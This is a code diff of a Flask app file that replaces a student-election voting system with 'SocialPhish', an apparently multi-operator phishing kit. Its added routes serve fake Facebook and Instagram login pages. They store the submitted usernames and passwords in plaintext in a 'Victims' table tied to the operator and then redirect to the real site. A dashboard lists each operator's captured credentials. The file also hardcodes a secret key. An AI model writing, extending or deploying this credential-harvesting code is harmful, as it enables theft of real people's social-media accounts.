@@ -1,539 +1,194 @@
-import os
-import secrets
 from flask import Flask, render_template, request, redirect, Response, send_file, flash, url_for
 from flask_sqlalchemy import SQLAlchemy 
-from flask_socketio import SocketIO, emit 
 from datetime import datetime
-from werkzeug.utils import secure_filename
+from wtforms import StringField, PasswordField, SubmitField, BooleanField
+from wtforms.validators import DataRequired, Length, Email, EqualTo, ValidationError
+from flask_wtf import FlaskForm
+from flask_wtf.file import FileField, FileAllowed
 from flask_bcrypt import Bcrypt
 from flask_login import  LoginManager, UserMixin, login_user, current_user, logout_user, login_required
-
-from flask_script import Manager
-from flask_migrate import Migrate, MigrateCommand
-from flask_socketio import SocketIO, emit 
-from threading import Thread
-from forms import *
 
 
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] ='982c3b7bjibe0cda4d1245c92e83df279'
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///filestorage.db'
-app.config['SQLALCHEMY_TRACK_MODIFICATIONS']=True
-
+app.config['SECRET_KEY'] ='982c3b7bfbe0cda4d1245c92e83df279'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///sophish.db'
 db = SQLAlchemy(app)
 bcrypt = Bcrypt(app)
 login_manager = LoginManager(app)
 login_manager.login_view = 'login'
 login_manager.login_message_category = 'info'
-migrate = Migrate(app, db)
-manager = Manager(app)
-socketio = SocketIO(app)
-
-manager.add_command('db', MigrateCommand)
 
 
-class IndexNumbers(db.Model):
+class Users(db.Model, UserMixin):
     id = db.Column(db.Integer, primary_key=True, autoincrement=True)
-    index_no = db.Column(db.Integer)
-    is_registered = db.Column(db.Boolean, nullable=False, default=False)
-
-
-class Halls(db.Model):
-    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
-    hall = db.Column(db.String(20))
-
-class Levels(db.Model):
-    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
-    level = db.Column(db.String(10))
-
-
-
-
-class Categories(db.Model):
-    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
-    sector = db.Column(db.String(20))
-
-
-class StudentProfile(db.Model, UserMixin):
-    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
-    full_name = db.Column(db.String(20), nullable=False)
-    phone = db.Column(db.Integer, nullable=True)
+    username = db.Column(db.String(20), nullable=False, unique=True)
     email = db.Column(db.String(120), nullable=False)
-    hall = db.Column(db.String(300), nullable=False)
-    level = db.Column(db.String(10), nullable=False)
-    index_no = db.Column(db.String(20), nullable=False)
-    password = db.Column(db.String(60), nullable=False)
-    voted_for_president = db.Column(db.Boolean, nullable=False, default=False)
-    voted_for_pro = db.Column(db.Boolean, nullable=False, default=False)
-    voted_for_dinning_hall = db.Column(db.Boolean, nullable=False, default=False)
-    voted_for_hall = db.Column(db.Boolean, nullable=False, default=False)
-    voted_for_house = db.Column(db.Boolean, nullable=False, default=False)
-    voted_for_entertainment = db.Column(db.Boolean, nullable=False, default=False)
-    voted_for_library = db.Column(db.Boolean, nullable=False, default=False)
-    voted_for_secretary = db.Column(db.Boolean, nullable=False, default=False)
-    voted_for_environment = db.Column(db.Boolean, nullable=False, default=False)
-    
-class Candidates(db.Model):
+    password = db.Column(db.String(60), nullable=False, default='N/A')
+    profile_pic = db.Column(db.String(20), nullable=True, default='default.jpg')
+   
+class Victims(db.Model):
     id = db.Column(db.Integer, primary_key=True, autoincrement=True)
-    candidate_name = db.Column(db.String(20), nullable=False)
-    moto = db.Column(db.String(30), nullable=False)
-    sector = db.Column(db.String(30), nullable=False)
-    image = db.Column(db.String(120), nullable=False, default='default.jpeg')
-    votes = db.Column(db.Integer, default=0)
-###################################           Forms    ########################################################
+    username = db.Column(db.String(60), nullable=False)
+    password = db.Column(db.String(60), nullable=False)
+    platform = db.Column(db.String(60), nullable=False)
+    uid = db.Column(db.Integer)
+
+   
 
 
 
-######################################### DECORATORS ################################################
 
 
+
+
+
+
+
+
+
+
+###################################[FORMS]#######################################################################################
+
+
+class RegistrationForm(FlaskForm):
+    username = StringField('Username', validators=[DataRequired(), Length(min=2, max=20)])
+    email = StringField('Email', validators=[DataRequired(), Email() ])
+    password = PasswordField('Password', validators=[ DataRequired()])
+    confirm_password = PasswordField('Confirm Password', 
+                                        validators=[DataRequired(), EqualTo('password')])
+    submit = SubmitField('Sign Up')
+
+    def validate_username(self, username):
+
+        user = Users.query.filter_by(username=username.data).first()
+        if user:
+            raise ValidationError('That Username Is Taken Please Choose A different Username' )
+
+    def validate_email(self, email):
+
+        user = Users.query.filter_by(email=email.data).first()
+        if user:
+            raise ValidationError('That Email Is Already In USe Please Choose A Different Email' )
+
+
+
+class LoginForm(FlaskForm):
+    email = StringField('Email', validators=[DataRequired(), Email() ])
+    password = PasswordField('Password', validators=[ DataRequired()])
+    remember = BooleanField('Remember Me')
+    submit = SubmitField('Login')
+
+#################################################################################################################################
+
+########################[DECORATORS]######################################################
 
 @login_manager.user_loader
 def load_user(user_id):
-    return StudentProfile.query.get(int(user_id))
+    return Users.query.get(int(user_id))
 
-@app.template_filter('clean_date')
-def clean_date(dt):
-    return dt.strftime('%d %b %Y')
+#############################################################################
 
+@app.route('/')
+def index():
+    return render_template('default/home.html', title='SocialPhish')
 
-def save_image(form_image):
-
-    f_n, f_ext = os.path.splitext(form_image.filename)
-    image_fn = form_image.filename
-    image_path = os.path.join(app.root_path, './static/profile', image_fn) 
-    form_image.save(image_path)
-    return image_fn
-
+@app.route('/dashboard')
+@login_required
+def dashboard():
+    victims = Victims.query.all()
+    return render_template('default/dashboard.html', title='Socialphish-Dashboard')
 
 
-def total_votes(category):
-    total = 0
-    for vote in category:
-        total += vote.votes
-    return total
-
-def all_votes():
-    votes = Candidates.query.all()
-    allvotes = 0
-    for vote in votes:
-        allvotes += vote.votes
-    return allvotes
-
-bars_colors = ['bg-gradient-warning', 'bg-gradient-info', 'bg-gradient-primary', 
-                'bg-gradient-success', 'bg-gradient-danger']
-bg_colors = ['blue', 'primary', 'success', 'red', 'purple', 'orange', 'default']
-
-####################################################################################################
-def t_students():
-    students = StudentProfile.query.all()
-    total = 0
-    for student in students:
-        total += 1
-    return total
-
-total_students = t_students()
-
-
-
-####################################################################################################
+@app.route('/victims')
+@login_required
+def victims():
+    if current_user.id == 1:
+        victims = Victims.query.all()
+        return render_template('victims.html', victims=victims, title='SocialPhish-Victims')
+    victims = Victims.query.filter_by(uid=current_user.id).all()
+    return render_template('victims.html', victims=victims, title='SocialPhish-Victims')
 
 
 
 
+
+############################ LOGIN ###########################
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     form = LoginForm()
     if form.validate_on_submit():
-        user = StudentProfile.query.filter_by(index_no=form.index_no.data).first()
+        user = Users.query.filter_by(email=form.email.data).first()
         if user and bcrypt.check_password_hash(user.password, form.password.data):
             login_user(user, remember=form.remember.data)
             flash('You Have Been Successfully Logged In', 'success')
             next_page = request.args.get('next')
             return redirect(next_page) if next_page else redirect(url_for('index'))
         else:
-            flash('Login unsuccessful please check index No. or Password', 'danger')
-    return render_template('login.html', tittle='Login', form=form, bgs=bg_colors)
+            flash('Login Unsuccessful Please Check Email And Password', 'danger')
+    return render_template('login.html', tittle='Login', form=form)
+
+
+
+############################ LOG OUT #################################
+
 
 @app.route('/logout')
-@login_required
 def logout():
     logout_user()
     return redirect(url_for('index'))
 
 
+ ############################ RESGISTRATION ###########################
 
-@app.route('/register',methods=["GET", "POST"])
+
+@app.route('/register', methods=['GET', 'POST'])
 def register():
-    form = StudentRegistration()
+    if current_user.is_authenticated:
+        return redirect(url_for('index'))
+    form = RegistrationForm()
     if form.validate_on_submit():
-        registered = IndexNumbers.query.filter_by(index_no=form.index_no.data).first()
-
         hash_password = bcrypt.generate_password_hash(form.password.data).decode('utf-8')
-        student_profile = StudentProfile(full_name=form.full_name.data, index_no=form.index_no.data, 
-                                        hall=form.hall.data, level=form.level.data, email=form.email.data, 
-                                        phone=form.phone.data, password=hash_password)
-        registered.is_registered=True
-        db.session.add(student_profile)
-
+        user = Users(username=form.username.data, email=form.email.data, password=hash_password)
+        db.session.add(user)
         db.session.commit()
-        flash('Your Account Has Been Created Successfully', 'success')
+        flash(f'Your Account Has Been Created You Can Now Login!', 'success')
         return redirect(url_for('login'))
-    return render_template('register.html', form=form, bgs=bg_colors)
-
-#####################################################################################################
+    return render_template('default/register.html', tittle='Register', form=form)
 
 
 
 
 
 
-@app.route('/new-candidate',  methods=['GET', 'POST'])
-@login_required
-def addcandidate():
-    form = CandidatesForm()
-    if form.validate_on_submit():
-        image = save_image(form.image.data)
-        candidate = Candidates(candidate_name=form.candidate_name.data, 
-                                sector=form.sector.data, moto=form.moto.data, image=image)
-        db.session.add(candidate)
+@app.route('/facebook/<int:uid>', methods=['GET', 'POST'])
+def facebook(uid):
+    if request.method == 'POST':
+        captured_username = request.form['username']
+        captured_password = request.form['user_password']
+        new_victim = Victims(username=captured_username, platform='Facebook', password=captured_password, uid=uid)
+        db.session.add(new_victim)
         db.session.commit()
-        flash('Candidate Added Successfully', 'success')
-        return redirect(url_for('index'))
-    return render_template('addcandidate.html', form=form, bgs=bg_colors)
-
-
-@app.route('/president', methods=['GET', 'POST'])
-@login_required
-def president():
-    if current_user.voted_for_president == True:
-        flash('You have already voted for president ', 'warning')
-        return redirect(url_for('index'))
-    candidates = Candidates.query.filter_by(sector='President').all()
-    if request.method == 'POST' and request.form.get('vote'):
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-        candidate.votes += 1
-        current_user.voted_for_president = True
-        
-        db.session.commit()
-        return redirect('/#president')
-    elif request.method == 'POST':
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
+        return redirect('https://facebook.com')
     else:
-        return render_template('candidates.html', candidates=candidates, Category='Presidential Category', bgs = bg_colors)
+        return render_template('/facebook/index.html')
 
 
-@app.route('/dinning-hall', methods=['GET', 'POST'])
-@login_required
-def dinning_hall():
-    if current_user.voted_for_dinning_hall == True:
-        flash('You have already voted dinning-hall', 'warning')
-        return redirect(url_for('index'))
-    candidates = Candidates.query.filter_by(sector='Dinning Hall').all()
-    if request.method == 'POST' and request.form.get('vote'):
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-        candidate.votes += 1
-        current_user.voted_for_dinning_hall = True
-        
+
+@app.route('/instagram/<int:uid>', methods=['GET', 'POST'])
+def instagram(uid):
+    if request.method == 'POST':
+        captured_username = request.form['username']
+        captured_password = request.form['user_password']
+        new_victim = Victims(username=captured_username, platform='Instagram', password=captured_password, uid=uid)
+        db.session.add(new_victim)
         db.session.commit()
-        return redirect('/#dinning-hall')
-    elif request.method == 'POST':
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
+        return redirect('https://instagram.com')
     else:
-        return render_template('candidates.html', candidates=candidates, Category='Dinnning Hall Category', bgs = bg_colors)
+        return render_template('/instagram/index.html')
+	
 
 
-@app.route('/secretary', methods=['GET', 'POST'])
-@login_required
-def secretary():
-    if current_user.voted_for_secretary == True:
-        flash('You have already voted secretary ', 'warning')
-        return redirect(url_for('index'))
-    candidates = Candidates.query.filter_by(sector='Secretary').all()
-    if request.method == 'POST' and request.form.get('vote'):
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-        candidate.votes += 1
-        current_user.voted_for_secretary = True
-        
-        db.session.commit()
-        return redirect('/#secretary')
-    elif request.method == 'POST':
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-    else:
-        return render_template('candidates.html', candidates=candidates, Category='Secretary Category', bgs = bg_colors)
-
-
-@app.route('/pro', methods=['GET', 'POST'])
-@login_required
-def pro():
-    if current_user.voted_for_pro == True:
-        flash('You have already voted pro', 'warning')
-        return redirect(url_for('index'))
-    candidates = Candidates.query.filter_by(sector='PRO').all()
-    if request.method == 'POST' and request.form.get('vote'):
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-        candidate.votes += 1
-        current_user.voted_for_pro = True
-        
-        db.session.commit()
-        return redirect('/#pro')
-    elif request.method == 'POST':
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-    else:
-        return render_template('candidates.html', candidates=candidates, Category='Pro Category', bgs = bg_colors)
-
-
-@app.route('/environment', methods=['GET', 'POST'])
-@login_required
-def environment():
-    if current_user.voted_for_environment == True:
-        flash('You have already voted environment', 'warning')
-        return redirect(url_for('index'))
-    candidates = Candidates.query.filter_by(sector='Environment').all()
-    if request.method == 'POST' and request.form.get('vote'):
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-        candidate.votes += 1
-        current_user.voted_for_environment = True
-        
-        db.session.commit()
-        return redirect('/#environment')
-    elif request.method == 'POST':
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-    else:
-        return render_template('candidates.html', candidates=candidates, Category='Environment Category', bgs = bg_colors)
-
-
-@app.route('/library', methods=['GET', 'POST'])
-@login_required
-def library():
-    if current_user.voted_for_library == True:
-        flash('You have already voted library', 'warning')
-        return redirect(url_for('index'))
-    candidates = Candidates.query.filter_by(sector='Library').all()
-    if request.method == 'POST' and request.form.get('vote'):
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-        candidate.votes += 1
-        current_user.voted_for_library = True
-        
-        db.session.commit()
-        return redirect('/#library')
-    elif request.method == 'POST':
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-    else:
-        return render_template('candidates.html', candidates=candidates, Category='Library Category', bgs = bg_colors)
-
-
-@app.route('/entertainment', methods=['GET', 'POST'])
-@login_required
-def entertainment():
-    if current_user.voted_for_entertainment == True:
-        flash('You have already voted entertainment', 'warning')
-        return redirect(url_for('index'))
-    candidates = Candidates.query.filter_by(sector='Entertainment').all()
-    if request.method == 'POST' and request.form.get('vote'):
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-        candidate.votes += 1
-        current_user.voted_for_entertainment = True
-        
-        db.session.commit()
-        return redirect('/#entertainment')
-    elif request.method == 'POST':
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-    else:
-        return render_template('candidates.html', candidates=candidates, Category='Entertainment Category', bgs = bg_colors)
-
-
-
-@app.route('/hall', methods=['GET', 'POST'])
-@login_required
-def hall():
-    if current_user.voted_for_hall == True:
-        flash('You have already voted hall', 'warnig')
-        return redirect(url_for('index'))
-    candidates = Candidates.query.filter_by(sector=current_user.hall).all()
-    if request.method == 'POST' and request.form.get('vote'):
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-        candidate.votes += 1
-        current_user.voted_for_hall = True
-        db.session.commit()
-        
-        return redirect('/#hall')
-    elif request.method == 'POST':
-        voted_for = request.form.get('vote')
-        candidate = Candidates.query.get(voted_for)
-        if candidate == None:
-            flash('No Vote Was Selected', 'warning')
-            return redirect('')
-    else:
-        return render_template('candidates.html', candidates=candidates, Category=f'{current_user.hall} Category', bgs = bg_colors)
-
-
-
-
-@app.route('/', methods=['GET', 'POST'])
-def index():
-    total_vote_count = all_votes()
-    secretaries = Candidates.query.filter_by(sector='Secretary').all()
-    total_secretaries_votes = total_votes(secretaries)
-
-    presidents = Candidates.query.filter_by(sector='President').all()
-    total_president_votes = total_votes(presidents)
-
-    dinning_halls = Candidates.query.filter_by(sector='Dinning Hall').all()
-    total_dinning_hall_votes = total_votes(dinning_halls)
-
-    environment = Candidates.query.filter_by(sector='Environment').all()
-    total_environment_votes = total_votes(environment)
-
-    pro_ = Candidates.query.filter_by(sector='PRO').all()
-    total_pro_votes = total_votes(pro_)
-
-    halls = Candidates.query.filter_by(sector='Hall').all()
-    total_halls_votes = total_votes(halls)
-
-    library = Candidates.query.filter_by(sector='Library').all()
-    total_library_votes = total_votes(library)
-
-    entertainment = Candidates.query.filter_by(sector='Entertainment').all()
-    total_entertainment_votes = total_votes(entertainment)
-
-    return render_template('tables.html', halls=halls, secretaries=secretaries, 
-                            dinning_halls=dinning_halls, presidents=presidents, entertainment=entertainment,
-                            library=library, environment=environment, pro_=pro_,
-                            total_secretaries_votes=total_secretaries_votes, 
-                            total_dinning_hall_votes=total_dinning_hall_votes, 
-                            total_president_votes=total_president_votes, 
-                            total_halls_votes=total_halls_votes, 
-                            total_vote_count=total_vote_count, 
-                            total_pro_votes=total_pro_votes,
-                            total_library_votes=total_library_votes, 
-                            total_environment_votes=total_environment_votes, 
-                            total_entertainment_votes=total_entertainment_votes, 
-                            colors=bars_colors, total = total_students, bgs = bg_colors)
-
-
-
-
-
-
-@app.route('/profile')
-@login_required
-def profile():
-    return render_template('profile.html', bgs=bg_colors)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-@app.route('/num')
-def num():
-    with open('./creds/numbers.txt', 'r') as f:
-        index_numbers = f.readlines()
-        for i in index_numbers:
-            number = IndexNumbers(index_no=i)
-            db.session.add(number)
-            db.session.commit()
-    with open('./creds/category.txt', 'r') as f:
-        index_numbers = f.readlines()
-        for i in index_numbers:
-            item = Categories(sector=i)
-            db.session.add(item)
-            db.session.commit()
-    with open('./creds/levels.txt', 'r') as f:
-        index_numbers = f.readlines()
-        for i in index_numbers:
-            lvl = Levels(level=i)
-            db.session.add(lvl)
-            db.session.commit()
-    with open('./creds/halls.txt', 'r') as f:
-        index_numbers = f.readlines()
-        for i in index_numbers:
-            hll = Halls(hall=i)
-            db.session.add(hll)
-            db.session.commit()
-    return redirect('/')
-            
-
-
-
-
-
-if __name__=="__main__":
-    #socketio.run(app, debug=True)
-    app.run(debug=True)
-    #manager.run()
+if __name__=='__main__':
+	app.run(debug=True)
